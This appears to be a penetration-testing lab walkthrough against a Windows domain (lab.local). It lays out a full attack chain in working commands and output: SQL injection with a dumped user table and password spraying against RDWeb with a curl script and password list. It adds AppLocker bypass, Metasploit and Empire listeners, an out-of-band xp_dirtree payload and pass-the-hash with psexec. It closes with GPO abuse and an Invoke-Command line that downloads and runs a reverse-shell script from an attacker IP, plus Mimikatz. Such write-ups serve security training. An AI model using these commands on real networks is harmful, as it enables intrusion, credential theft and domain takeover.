<p>There is a firewall in place so we scan some likely ports with the no ping (-Pn) option and add increased speed (-T4) and version detection (-sV)
nmap -T4 -sV -Pn -p80,443 10.7.12.0/24</p>

<p>Nmap scan report for 10.7.12.10 <br />
Host is up (0.070s latency). <br />
PORT    STATE    SERVICE  VERSION <br />
80/tcp  filtered http <br />
443/tcp open     ssl/http Microsoft IIS httpd 8.5 <br />
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                                                                                          </p>

<p>Nmap scan report for 10.7.12.11 <br />
Host is up (0.097s latency). <br />
PORT    STATE    SERVICE  VERSION <br />
80/tcp  filtered http <br />
443/tcp open     ssl/http Microsoft IIS httpd 10.0 <br />
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                                                                                          </p>

<p>Nmap scan report for 10.7.12.12 <br />
Host is up (0.51s latency). <br />
PORT    STATE    SERVICE VERSION
80/tcp  open     http    Microsoft IIS httpd 8.5
443/tcp filtered https
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>

<p>Nmap scan report for 10.7.12.13
Host is up (0.25s latency).
PORT    STATE    SERVICE VERSION
80/tcp  open     http    Microsoft IIS httpd 10.0
443/tcp filtered https
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>

<p>We bust the http ports for available directories and find on on 10.7.12.12/mvc
This is a sales site and uses a backend database to manage its merchandise information. </p>

<p>SQLi
The url shows an aspx script that makes a call to the databse to retrieve product information.
We capture the request and probe this injection point with sqlmap.</p>

<p>GET /mvc/Product.aspx?ProductSubCategoryId=18 HTTP/1.1
Host: 10.7.12.12
User-Agent: Mozilla/5.0 (X11; Linux x86<em>64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.7.12.12/mvc/
Cookie: _</em>AntiXsrfToken=e1e188c81f744fad9a0d59ef8c17af71
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1</p>

<p>sqlmap -r product.req</p>

<p>This proves successful and we are able to dump the entire database. 
Of interest is a table giving Active Directory users fullnames and their respective groups</p>

<p>Database: ADConnect
Table: ADUsers
[40 entries]
+------------+-------------+-----------------+
| LastName   | FirstName   | Department      |
+------------+-------------+-----------------+
| Vazquez    | Annie       | Finance         |
| Falcon     | Paul        | Finance         |
| Anthony    | Fae         | Finance         |
| Dillard    | Walter      | Finance         |
| Bradford   | Louis       | Finance         |
| Gage       | Sonya       | Finance         |
| Sanchez    | Alba        | Finance         |
| Branch     | Daniel      | Finance         |
| Cruz       | Christopher | Finance         |
| Johnson    | Nicole      | Finance         |
| Holliday   | Mary        | Human Resources |
| Shoemaker  | Michael     | Human Resources |
| Slater     | Arlene      | Human Resources |
| Prentiss   | Kelsey      | Human Resources |
| Davis      | Ginger      | Human Resources |
| McDaniel   | Johnny      | Human Resources |
| Jones      | James       | Human Resources |
| Garcia     | Thomas      | Human Resources |
| Harrison   | Melissa     | Human Resources |
| Hight      | Nicholas    | Human Resources |
| Baird      | William     | Marketing       |
| Ochoa      | Michelle    | Marketing       |
| Hopkins    | Joshua      | Marketing       |
| Blea       | Howard      | Marketing       |
| Pennington | Clara       | Marketing       |
| Glen       | David       | Marketing       |
| Hartsfield | Kim         | Marketing       |
| Ramirez    | Rita        | Marketing       |
| Hafner     | Opal        | Marketing       |
| Matthews   | Louie       | Marketing       |
| Okeefe     | Lee         | Sales           |
| Burrows    | Roger       | Sales           |
| Steele     | Charles     | Sales           |
| Wallace    | Juan        | Sales           |
| Lewis      | Donita      | Sales           |
| Santiago   | Juanita     | Sales           |
| Shepherd   | Wesley      | Sales           |
| Brown      | Steven      | Sales           |
| Wilson     | Johnny      | Sales           |
| May        | Juan        | Sales           |
+------------+-------------+-----------------+</p>

<p>dirbusting the other open http/s ports we find /rdweb access ie remote dsktop web access. 
If we can derive the correct username given the full names of the AD users we can test weak passwords with the rdweb login.</p>

<p>For this one can use a tool like burp intruder:
enter "LAB/USERNAME" and "PASSWORD" into the login field and capture with burp/zap proxy:</p>

<p>POST /RDWeb/Pages/en-US/login.aspx?ReturnUrl=%2FRDWeb%2FPages%2Fen-US%2FDefault.aspx HTTP/1.1
Host: 10.7.12.11
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.7.12.11/RDWeb/Pages/en-US/login.aspx?ReturnUrl=%2FRDWeb%2FPages%2Fen-US%2FDefault.aspx
Cookie: TSWAFeatureCheckCookie=true; TSWAAuthClientSideCookie=Name=DOMAIN%5CUSERNAME&amp;MachineType=private&amp;WorkSpaceID=RDS02.lab.local
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 293</p>

<p>WorkSpaceID=RDS02.lab.local&amp;RDPCertificates=&amp;PublicModeTimeout=20&amp;PrivateModeTimeout=240&amp;WorkspaceFriendlyName=Work%2520Resources&amp;EventLogUploadAddress=&amp;RedirectorName=RDS02.lab.local&amp;ClaimsHint=&amp;ClaimsToken=&amp;isUtf8=1&amp;flags=4&amp;DomainUserName=LAB%5Cavasquez&amp;UserPass=PASSWORD&amp;MachineType=private</p>

<p>Intruder: 
-you can use the "cluster bomb" attack
-remove the placeholders save for the the two USERNAME fields and the the PASSWORD field
-we are relating payloads to a given placeholder here so use the userlist you created for placeholder1 and copy that lost for paload 2 and use a password list for payload 3
-make sure to Always Follow Redirection in the options tab</p>

<p>alternative to burp: script something yourself:
curl -k --referer ' https://10.7.12.11/RDWeb/Pages/en-US/login.aspx?ReturnUrl=%2FRDWeb%2FPages%2Fen-US%2FDefault.aspx' -b 'TSWAFeatureCheckCookie=true; TSWAAuthClientSideCookie=Name=LAB%5Cavazquez&amp;MachineType=private&amp;WorkSpaceID=RDS02.lab.local' -d 'WorkSpaceID=RDS02.lab.local&amp;RDPCertificates=&amp;PublicModeTimeout=20&amp;PrivateModeTimeout=240&amp;WorkspaceFriendlyName=Work%2520Resources&amp;EventLogUploadAddress=&amp;RedirectorName=RDS02.lab.local&amp;ClaimsHint=&amp;ClaimsToken=&amp;isUtf8=1&amp;flags=4&amp;DomainUserName=LAB%5Cavasquez&amp;UserPass=Spring2017!&amp;MachineType=private' 'https://10.7.12.11/RDWeb/Pages/en-US/login.aspx?ReturnUrl=%2FRDWeb%2FPages%2Fen-US%2FDefault.aspx'</p>

<p>password list:
Summer2017!
Winter2017!
Fall2017!
Spring2017!
Summer2018!
Winter2018!
Fall2018!
Spring2018!</p>

<p>user credentials found:
avazquez:Spring2017!
mholliday:Summer2017!
wbaird:Autum2017!</p>

<p>use an rdp client to login to RDS02 at 10.8.14.17
we can see windows defender and applocker are preventing us from executing most things
running $ExecutionContext.SessionState.LanguageMode
tells us we're running in a ConstrainedLanguage mode</p>

<p>pasting the contents of applocker-bypas-checker.ps1 into notepad and saving as a ps1 file allows us to run with powershell
running show us the \windows\Tasks, \windows\tracing\, \windows\system32\spool\drivers\color  allow "BUILTIN\USERS" to write/createFiles &amp; execute auth</p>

<p>Escaping ConstrainedLanguage mode with Powershdll:
-running powershell without the powershell.exe</p>

<p>Using Shellter to trick Applocker
-nc.exe "rewired" to call to a waiting metasploit listener</p>

<p>Going from msf to empire (via Chryzsh):
In Empire:
create a default http listener named "http"
-uselistener http
-set Host 10.7.253.10
-set Port 4444
-execute
create copy launcher, created w/o base64
-back
-usestager multi/launcher
-set Base64 false
-generate</p>

<p>In MSF:
-load powershell
-powershell_shell
-paste listener and execute await agent in empire</p>

<p>with empire we can enumerate the system:</p>

<h2>ComputerName</h2>

<p>DC01
WS03
FS01
MX01
WEB01
WS05
RDS02
SQL01</p>

<p>Name           Type Remark              ComputerName <br />
----           ---- ------              ------------ <br />
ADMIN$   2147483648 Remote Admin        DC01.lab.local <br />
C$       2147483648 Default share       DC01.lab.local <br />
IPC$     2147483651 Remote IPC          DC01.lab.local <br />
NETLOGON          0 Logon server share  DC01.lab.local <br />
SYSVOL            0 Logon server share  DC01.lab.local <br />
ADMIN$   2147483648 Remote Admin        WS03.lab.local <br />
C$       2147483648 Default share       WS03.lab.local <br />
IPC$     2147483651 Remote IPC          WS03.lab.local <br />
address           0                     MX01.lab.local <br />
ADMIN$   2147483648 Remote Admin        MX01.lab.local <br />
C$       2147483648 Default share       MX01.lab.local <br />
IPC$     2147483651 Remote IPC          MX01.lab.local
ADMIN$   2147483648 Remote Admin        WEB01.lab.local
C$       2147483648 Default share       WEB01.lab.local
IPC$     2147483651 Remote IPC          WEB01.lab.local
ADMIN$   2147483648 Remote Admin        WS05.lab.local
C$       2147483648 Default share       WS05.lab.local
IPC$     2147483651 Remote IPC          WS05.lab.local
ADMIN$   2147483648 Remote Admin        RDS02.lab.local
C$       2147483648 Default share       RDS02.lab.local
IPC$     2147483651 Remote IPC          RDS02.lab.local
ADMIN$   2147483648 Remote Admin        SQL01.lab.local
C$       2147483648 Default share       SQL01.lab.local
IPC$     2147483651 Remote IPC          SQL01.lab.local</p>

<p>Discover the VPN to facilitate internal access to the subnet
//FS01.lab.local/GroupData/LabUserVPN.ovpn</p>

<p>We can use responder and ntlnrelayx to dump hashes
./Responder.py -I tun1 -wrf 
  -disable http/s and smb
./ntlmrelayx.py -tf ~/lkys37en-lab/labnotes/targets.txt</p>

<p>Out of band SQLi
We have an injection point from step one. 
To prompt the hash of the owner of the sql db to be sent to responder we need to instigat a DNS query to our IP.
We are requesting data be sent via HTML, SMB, or DNS. <br />
With MSSQL we use master..xp<em>dirtree (MySQL: LOAD</em>FILE()).
Supplying a hostname to these functions will cause a DNS lookup to occur. 
We're not interested in successful transmission of the information but the target user with send their netNTLMv2 hash along with their request to our machine.
a href= https://www.gracefulsecurity.com/sql-injection-out-of-band-exploitation/
/mvc/Product.aspx?ProductSubCategoryId=18;declare @q varchar(99);set @q='\10.8.254.14\test1'; exec master.dbo.xp<em>dirtree @q
/mvc/Product.aspx?ProductSubCategoryId=18;declare%20@q%20varchar(99);set%20@q=%27\10.8.254.14\test1%27;%20exec%20master.dbo.xp</em>dirtree%20@q</p>

<p>./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e administrator@10.8.14.14
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies</p>

<p>[<em>] Requesting shares on 10.8.14.14.....
[</em>] Found writable share ADMIN$
[<em>] Uploading file JkqJuZDF.exe
[</em>] Opening SVCManager on 10.8.14.14.....
[<em>] Creating service HPPN on 10.8.14.14.....
[</em>] Starting service HPPN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.</p>

<p>C:\Windows\system32&gt;whoami
nt authority\system</p>

<p>System on sql01 then use token impersonation to get to bdavis</p>

<p>GPO Enumeration:
Get Group Policy Objects
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}</p>

<p>Get-NetGPO -DisplayName MailServer-Config | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}</p>

<p>Get-NetOU -GUID "{2259E5B0-3B49-4704-98BB-5A9581B54E8E}" | %{Get-NetComputer -ADSpath $_}</p>

<p>Add "Server Admins" to the below file
type "\lab.local\sysvol\lab.local\Policies{2259E5B0-3B49-4704-98BB-5A9581B54E8E}\MACHINE\Preferences\Groups\Groups.xml"</p>

<p>Invoke-GpUpdate -Computer MX01 -Force</p>

<p>Since BDavis is a user on MX01 we can move laterally via Invoke-Command or just run Mimikatz on the Box
Invoke-Command -ComputerName MX01 -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://10.8.254.10/Invoke-PowerShellTcpOneLine.ps1')}
Invoke-Command -ComputerName MX01 -ScriptBlock {.\Invoke-Mimikatz.ps1)}</p>

<p>we get NTLM hashes for BDavis and Ross, who is a Domain Admin. 
With this info we are able to use the Ross account to add us to net users and Domain Admins
we user cme to expoit the hashes and get a shell.</p>
